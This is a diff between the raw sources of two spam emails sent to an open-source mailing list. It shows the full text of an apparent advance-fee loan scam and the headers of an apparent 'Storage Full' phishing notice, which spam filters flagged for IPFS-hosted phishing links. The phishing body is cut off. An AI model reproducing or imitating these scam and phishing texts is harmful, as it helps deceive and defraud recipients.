@@ -2,81 +2,88 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id F32BCBCEE6E
-	for <lists+industrypack-devel@lfdr.de>; Sat, 11 Oct 2025 04:06:47 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 98DDDBD09FA
+	for <lists+industrypack-devel@lfdr.de>; Sun, 12 Oct 2025 20:40:14 +0200 (CEST)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=lists.sourceforge.net; s=beta; h=Content-Type:Cc:Reply-To:From:
-	List-Subscribe:List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:
-	Subject:MIME-Version:Message-ID:Date:To:Sender:Content-Transfer-Encoding:
+	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
+	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
+	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
 	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
-	bh=lWgWTvTKYDMqPEA7yhRQZEfITIjMTNRPLIkE4k1OLvQ=; b=T/4zqeBvr3yVSKCx/eKfSWykpo
-	/1dCPdWbFp1sp71oSkrAqJyNp2IYb8HhrbvHP/SCvto8RZTSofpa6No/nVBlqGgp8I/mTISzNzmvJ
-	VpjxpC1jBOVAAQ6H3nqeIIXh2w2uppcMHOO5IlDbWZx5H5deipAFTXsQp3c/q4/sfhzI=;
-Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
-	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	bh=SmBrSj4Ff1gXW9cqEJ37XGtrXsdcR1dGdXGMcjJ5oRw=; b=cAIN/GBbTBwKdjqzVgjaRMY1r1
+	jnC7yFmzkavCXfM39juIonkG3HHQYqPsgtTYWjFPsL2MYuD/1vHGNi0O8JrZs+wCPimAQgnM1xarF
+	YQfLDI5hCUNqVWBDDkFCjt2fVLQ0IvoEp/wJI0ZaRlHbn68/PxQyfFr5EREwlXKxXYp0=;
+Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
+	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1v7P0Q-0006dN-LB
+	id 1v80zI-0006ZY-J1
 	for lists+industrypack-devel@lfdr.de;
-	Sat, 11 Oct 2025 02:06:46 +0000
+	Sun, 12 Oct 2025 18:40:08 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
- by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <bertrand.charge@deep-sek.asia>) id 1v7P0G-0006cs-UQ
+ (envelope-from <mailer-daemon@host2.i4dots.com>) id 1v80zG-0006ZJ-RN
  for industrypack-devel@lists.sourceforge.net;
- Sat, 11 Oct 2025 02:06:36 +0000
+ Sun, 12 Oct 2025 18:40:06 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
  d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
- MIME-Version:Message-ID:Date:To:From:Reply-To:Sender:Cc:Content-ID:
+ MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=zcSCol30pI9T3yec5nT4pzkgTxBZyV1XRq9TDtIWVTY=; b=RMdsUOPcl1eU/duJkJ1x0JIXVZ
- HzaNDpJQNdp7DUotnWX+49KGyoS55zxmQSjS/HKzDwXxzZma4+KApCr5KF6mMqqujWy35cVkmPoM8
- lC0mpaGM6YAytESI1eyqU06jg+kH+mhQPqi/W1DVf8ci+SEYMBi2nR39SlOvge/fb3go=;
+ bh=v5PNLX+w/e0XE3qLph9QX06rWJSLBxc0Et9b1EMVhF8=; b=jLbODKhU7A4Vq9cFqBWOPJdwKc
+ qQ6LOuk1/mhkA31HXezhh2CmtSkeG/5BGjtaGepLpzWC80h4idAtp/MbzNBx8V5Pm7OZ6om0phmil
+ PZrK/k9nx2rDyfPTASxTrQNgz668vyqFu0cBw2sjiN0Fo2AmUw7Xh63UDBcp+lxb/ptc=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
  h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
- Date:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date:
+ Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=zcSCol30pI9T3yec5nT4pzkgTxBZyV1XRq9TDtIWVTY=; b=l
- RhtLVxnSQPggG+kRGfiehjp1od/yz0ZGmeXqB77m5Piv6u5ZApnNSrfUW3vFRdUF3F3YyVehUYhSI
- 5uweZkTIazY5yiNoRDxYsjDP4ynvfzFac6UdANqJfEViMbiVePUzctTH619L0o+rr535GT9BSAeyl
- 6OFMNGX8q+QFysFo=;
-Received: from [188.130.238.117] (helo=c2-shop.ink)
- by sfi-mx-2.v28.lw.sourceforge.com with esmtps
- (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
- id 1v7P0A-0003GK-NZ for industrypack-devel@lists.sourceforge.net;
- Sat, 11 Oct 2025 02:06:32 +0000
+ List-Owner:List-Archive; bh=v5PNLX+w/e0XE3qLph9QX06rWJSLBxc0Et9b1EMVhF8=; b=m
+ EjUAP6P1qKylLdDTAO3h94sHIfLK57nSTczlrUp/fn7XBH9Asvj5VloghUsPVprFDez9uTx8FBOcC
+ o38+9WeO27kji9WoFio0CD7h9dBK5/SlbajD6YcaO/WotTYgwjWfi9/3eZ2ultvevWkDq5Bqf/c20
+ cywejh0ffSlrN6E4=;
+Received: from [172.245.106.40] (helo=host2.i4dots.com)
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
+ id 1v80zG-0004to-3y for industrypack-devel@lists.sourceforge.net;
+ Sun, 12 Oct 2025 18:40:06 +0000
+From: Mail Delivery System <mailer-daemon@host2.i4dots.com>
 To: industrypack-devel@lists.sourceforge.net
-Date: 11 Oct 2025 01:55:28 -0700
-Message-ID: <20251011015527.D93C4CC06CCFC592@deep-sek.asia>
+Date: 12 Oct 2025 15:39:54 -0300
+Message-ID: <20251012153954.7EF203424D474A01@host2.i4dots.com>
 MIME-Version: 1.0
-X-Spam-Score: 7.9 (+++++++)
+X-Spam-Score: 6.8 (++++++)
 X-Spam-Report: Spam detection software,
- running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
+ running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
  has identified this incoming email as possible spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview: This sender has been verified from senders list. Dear
- industrypack-devel@lists.sourceforge.net, 
- Content analysis details:   (7.9 points, 5.0 required)
+ Content preview: 10/12/2025 3:39:54 p.m. Storage Full: 95%
+ industrypack-devel@lists.sourceforge.net
+ Message Failure Delivery Notice. 
+ Content analysis details:   (6.8 points, 5.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 4.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
- [188.130.238.117 listed in dnsbl-1.uceprotect.net]
- 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
+ 4.0 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+ [Blocked - see <https://www.spamcop.net/bl.shtml?172.245.106.40>]
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
+ 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
+ background
  0.0 HTML_MESSAGE           BODY: HTML included in message
+ 1.4 URI_IPFSIO References Interplanetary File System PtP content via
+ ipfs.io, likely phishing
  1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
- 2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
  0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
+ 0.0 URI_IPFS               References Interplanetary File System PtP content,
+ probable phishing
 X-VA-Spam-Flag: YES
 X-Spam-Flag: YES
-X-Headers-End: 1v7P0A-0003GK-NZ
-Subject: [Industrypack-devel] [SPAM] Capital Funding Inquiry
+X-Headers-End: 1v80zG-0004to-3y
+Subject: [Industrypack-devel] [SPAM] ATTENTION:
+ industrypack-devel@lists.sourceforge.net
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -88,318 +95,203 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-From: BUSINESS MANAGER via Industrypack-devel
- <industrypack-devel@lists.sourceforge.net>
-Reply-To: bertrand.charge_krones.fr@hotmail.com
-Cc: BUSINESS MANAGER <bertrand.charge@deep-sek.asia>
-Content-Type: multipart/mixed; boundary="===============7913652947358151156=="
+Content-Type: multipart/mixed; boundary="===============4172719325842794229=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
---===============7913652947358151156==
+--===============4172719325842794229==
 Content-Type: text/html;
 	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-<html><head>
-<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
-</head><body>
-<table style=3D'text-align: left; color: rgb(66, 66, 66) !important; text-t=
-ransform: none; line-height: inherit; letter-spacing: normal; font-family: =
-"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFo=
-nt, Roboto, "Helvetica Neue", sans-serif; font-size: 15px; font-style: norm=
-al; font-weight: 400; word-spacing: 0px; white-space: normal; border-collap=
-se: collapse; direction: ltr; border-spacing: 0px; orphans: 2; widows: 2; f=
-ont-size-adjust: inherit; font-stretch: inherit;=20
-font-feature-settings: inherit; background-color: rgb(255, 255, 255); text-=
-decoration-color: initial; font-variant-ligatures: normal; font-variant-cap=
-s: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initi=
-al; text-decoration-style: initial; font-variant-numeric: inherit; font-var=
-iant-east-asian: inherit; font-variant-alternates: inherit; font-variant-po=
-sition: inherit; font-variant-emoji: inherit; font-optical-sizing: inherit;=
- font-kerning: inherit; font-variation-settings:=20
-inherit;' cellspacing=3D"0" cellpadding=3D"0" data-olk-copy-source=3D"Messa=
-geBody"><tbody><tr><td style=3D"padding: 3.75pt; border: 1pt solid black; b=
-order-image: none; width: 1.5pt; height: 31px; text-align: left; white-spac=
-e: normal !important; direction: ltr; background-color: rgb(2, 151, 64) !im=
-portant;">
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; text-align: center; color: black !important; line-height: inher=
-it; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, H=
-elvetica, sans-serif; font-size: 12pt; font-style: inherit; font-variant: i=
-nherit; font-weight: inherit; vertical-align: baseline; direction: ltr; fon=
-t-size-adjust: inherit; font-stretch: inherit; font-feature-settings: inher=
-it; font-optical-sizing: inherit; font-kerning:=20
-inherit; font-variation-settings: inherit;"><b>&nbsp;</b></div></td><td sty=
-le=3D"border-width: 1pt; border-style: solid solid solid none; border-color=
-: black; padding: 3.75pt; width: 525pt; height: 31px; text-align: left; whi=
-te-space: normal !important; direction: ltr; background-color: rgb(243, 255=
-, 248) !important;">
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; text-align: left; color: black !important; line-height: inherit=
-; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, Hel=
-vetica, sans-serif; font-size: 12pt; font-style: inherit; font-variant: inh=
-erit; font-weight: inherit; vertical-align: baseline; direction: ltr; font-=
-size-adjust: inherit; font-stretch: inherit; font-feature-settings: inherit=
-; font-optical-sizing: inherit; font-kerning:=20
-inherit; font-variation-settings: inherit;">This sender has been verified f=
-rom senders list.</div></td></tr></tbody></table>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; text-align: left; color: black !important; text-transform: none=
-; line-height: inherit; text-indent: 0px; letter-spacing: normal; font-fami=
-ly: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, Helvetica, san=
-s-serif; font-size: 12pt; font-style: normal; font-weight: 400; word-spacin=
-g: 0px; vertical-align: baseline; white-space: normal; direction: ltr; orph=
-ans: 2; widows: 2; font-size-adjust: inherit;=20
-font-stretch: inherit; font-feature-settings: inherit; background-color: rg=
-b(255, 255, 255); text-decoration-color: initial; font-variant-ligatures: n=
-ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
-ration-thickness: initial; text-decoration-style: initial; font-variant-num=
-eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
-nherit; font-variant-position: inherit; font-variant-emoji: inherit; font-o=
-ptical-sizing: inherit; font-kerning: inherit;=20
-font-variation-settings: inherit;"><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; text-align: left; color: black !important; text-transform: none=
-; line-height: inherit; text-indent: 0px; letter-spacing: normal; font-fami=
-ly: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, Helvetica, san=
-s-serif; font-size: 12pt; font-style: normal; font-weight: 400; word-spacin=
-g: 0px; vertical-align: baseline; white-space: normal; direction: ltr; orph=
-ans: 2; widows: 2; font-size-adjust: inherit;=20
-font-stretch: inherit; font-feature-settings: inherit; background-color: rg=
-b(255, 255, 255); text-decoration-color: initial; font-variant-ligatures: n=
-ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
-ration-thickness: initial; text-decoration-style: initial; font-variant-num=
-eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
-nherit; font-variant-position: inherit; font-variant-emoji: inherit; font-o=
-ptical-sizing: inherit; font-kerning: inherit;=20
-font-variation-settings: inherit;">Dear industrypack-devel@lists.sourceforg=
-e.net,<br><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; text-align: left; color: black !important; text-transform: none=
-; line-height: inherit; text-indent: 0px; letter-spacing: normal; font-fami=
-ly: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, Helvetica, san=
-s-serif; font-size: 12pt; font-style: normal; font-weight: 400; word-spacin=
-g: 0px; vertical-align: baseline; white-space: normal; direction: ltr; orph=
-ans: 2; widows: 2; font-size-adjust: inherit;=20
-font-stretch: inherit; font-feature-settings: inherit; background-color: rg=
-b(255, 255, 255); text-decoration-color: initial; font-variant-ligatures: n=
-ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
-ration-thickness: initial; text-decoration-style: initial; font-variant-num=
-eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
-nherit; font-variant-position: inherit; font-variant-emoji: inherit; font-o=
-ptical-sizing: inherit; font-kerning: inherit;=20
-font-variation-settings: inherit;"><p style=3D'color: rgb(36, 36, 36) !impo=
-rtant; text-transform: none; text-indent: 0px; letter-spacing: normal; font=
--family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica =
-Neue", sans-serif; font-size: 15px; font-style: normal; font-weight: 400; m=
-argin-top: 0px; margin-bottom: 0px; word-spacing: 0px; orphans: 2; widows: =
-2; background-color: white !important; text-decoration-color: initial; text=
--decoration-style: initial;'>
-<br></p>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;">Thank you for your interest in our project funding servi=
-ces. We are pleased to assist you with your funding needs.</div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;">To proceed with the funding process, we kindly request t=
-hat you follow our standard procedure, which includes the following steps:<=
-/div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;"><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;">Business Plan: Please prepare and share a detailed busin=
-ess plan for the project you need funding for, including financial projecti=
-ons and project details.</div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;"><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;">Terms &amp; Conditions: Our standard financing terms inc=
-lude:</div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;"><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;">Interest Rate: 3% ROI</div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;">Loan Term: Varies from 1 to 10 years</div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;"><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;"><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;">We look forward to reviewing your business plan and movi=
-ng forward with this opportunity.<span>&nbsp;</span><span style=3D"color: b=
-lack; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri,=
- Helvetica, sans-serif; font-size: 12pt;">
-We typically schedule a Zoom/Team meeting for introductions and to walk you=
- through our procedures. Kindly let me know a convenient day and time for y=
-ou to speak with our company representative.</span></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; line-height: inhe=
-rit; text-indent: 0px; letter-spacing: normal; font-family: Aptos, Calibri,=
- Helvetica, sans-serif; font-size: 12pt; font-style: normal; font-weight: 4=
-00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
-ns: 2; widows: 2; font-size-adjust: inherit; font-stretch: inherit; backgro=
-und-color: white !important; text-decoration-color:=20
-initial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
--text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
-n-style: initial;"><br></div>
-<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
-mage: none; color: rgb(38, 40, 42); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Aptos, Calibri, Helvetica, sans-serif=
-; font-size: 12pt; font-style: normal; font-weight: 400; word-spacing: 0px;=
- vertical-align: baseline; white-space: normal; orphans: 2; widows: 2; back=
-ground-color: white !important; text-decoration-color: initial; font-varian=
-t-ligatures: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial;">Thank you and best regards,<br><br></div>
-<p style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-ima=
-ge: none; color: rgb(38, 40, 42); text-transform: none; text-indent: 0px; l=
-etter-spacing: normal; font-family: Aptos, Calibri, Helvetica, sans-serif; =
-font-size: 12pt; font-style: normal; font-weight: 400; word-spacing: 0px; v=
-ertical-align: baseline; white-space: normal; orphans: 2; widows: 2; backgr=
-ound-color: white !important; text-decoration-color: initial; font-variant-=
-ligatures: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial;"><br></p>
-<p style=3D'color: rgb(38, 40, 42); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
-ans-serif; font-size: 13px; font-style: normal; font-weight: 400; margin-to=
-p: 0px; margin-bottom: 0px; word-spacing: 0px; white-space: normal; orphans=
-: 2; widows: 2; background-color: rgb(255, 255, 255); text-decoration-color=
-: initial; font-variant-ligatures: normal; font-variant-caps: normal; -webk=
-it-text-stroke-width: 0px;=20
-text-decoration-thickness: initial; text-decoration-style: initial;'>Best r=
-egards,<br></p>
-<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
-padding: 0px; color: black; text-transform: none; line-height: inherit; tex=
-t-indent: 0px; letter-spacing: normal; font-family: Aptos, Aptos_EmbeddedFo=
-nt, Aptos_MSFontService, Calibri, Helvetica, sans-serif; font-size: 12pt; f=
-ont-style: normal; font-weight: 400; word-spacing: 0px; vertical-align: bas=
-eline; white-space: normal; direction: ltr; orphans: 2; widows: 2; font-str=
-etch: inherit; background-color: rgb(255, 255,=20
-255); text-decoration-color: initial; font-variant-ligatures: normal; font-=
-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
-ness: initial; text-decoration-style: initial;">
-<p style=3D'color: rgb(38, 40, 42); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
-ans-serif; font-size: 13px; font-style: normal; font-weight: 400; margin-to=
-p: 0px; margin-bottom: 0px; word-spacing: 0px; white-space: normal; backgro=
-und-color: rgb(255, 255, 255);'>
-<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
-padding: 0px; color: black; line-height: inherit; font-family: Aptos, Aptos=
-_EmbeddedFont, Aptos_MSFontService, Calibri, Helvetica, sans-serif; font-si=
-ze: 12pt; vertical-align: baseline; direction: ltr; font-stretch: inherit;"=
->Charg&eacute; Bertrand</span><br><span>BUSINESS MANAGER</span><br>Flo Proj=
-ect Management Services<br>7th floor Corniche Tower,<br>Corniche Road,Al Ru=
-mailah 2,<br>Ajman United Arab Emirates<br>
-Business Hours: Monday-Friday: 8:00 am - 6:00 pm<br>Email: <a href=3D"mailt=
-o:bertrand.charge_krones.fr@hotmail.com">bertrand.charge_krones.fr@hotmail.=
-com</a></p></span></div></body></html>
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV id=3Deditbody1>
+<DIV>
+<TABLE style=3D"FONT-SIZE: 15px; MAX-WIDTH: 548px; FONT-FAMILY: inherit; WI=
+DTH: 548px; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collap=
